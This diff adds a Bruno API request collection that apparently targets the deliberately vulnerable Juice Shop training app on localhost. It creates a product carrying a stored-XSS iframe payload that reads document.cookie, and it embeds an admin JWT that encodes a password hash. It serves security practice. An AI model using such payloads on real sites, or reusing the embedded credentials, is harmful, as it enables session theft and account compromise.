@@ -1,0 +1,45 @@
+{
+  "name": "Juice Shop",
+  "version": "1",
+  "items": [
+    {
+      "type": "http",
+      "name": "Create Product",
+      "filename": "Create Product.bru",
+      "seq": 1,
+      "request": {
+        "url": "http://localhost:3005/api/Products",
+        "method": "POST",
+        "headers": [],
+        "params": [],
+        "body": {
+          "mode": "json",
+          "json": "{\n  \"name\": \"XSS\",\n  \"description\": \"<iframe src=\\\"javascript:alert(document.cookie)\\\">\"\n}",
+          "formUrlEncoded": [],
+          "multipartForm": [],
+          "file": []
+        },
+        "script": {},
+        "vars": {},
+        "assertions": [],
+        "tests": "",
+        "docs": "",
+        "auth": {
+          "mode": "bearer",
+          "bearer": {
+            "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDMgMDc6MjI6MzUuOTYxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDMgMDc6MjI6MzUuOTYxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MTUyNzYzNX0.ndx3iJ2T8L7dwbaPwktlOA2EF4cZsg1visolIiSx3JNmFwj3HyrI9-5qxA_DISPSo68ouny50iUpX9yE03J5uS7PWcUbBsMW4MxRlzxQeTrDJGf1vta695UOBgQpwsunTXujy40KkkVeKE6JL-ABX5YIQZpO_rbQMuG8LaG0psg"
+          }
+        }
+      }
+    }
+  ],
+  "environments": [],
+  "brunoConfig": {
+    "version": "1",
+    "name": "Juice Shop",
+    "type": "collection",
+    "ignore": ["node_modules", ".git"],
+    "size": 0,
+    "filesCount": 0
+  }
+}
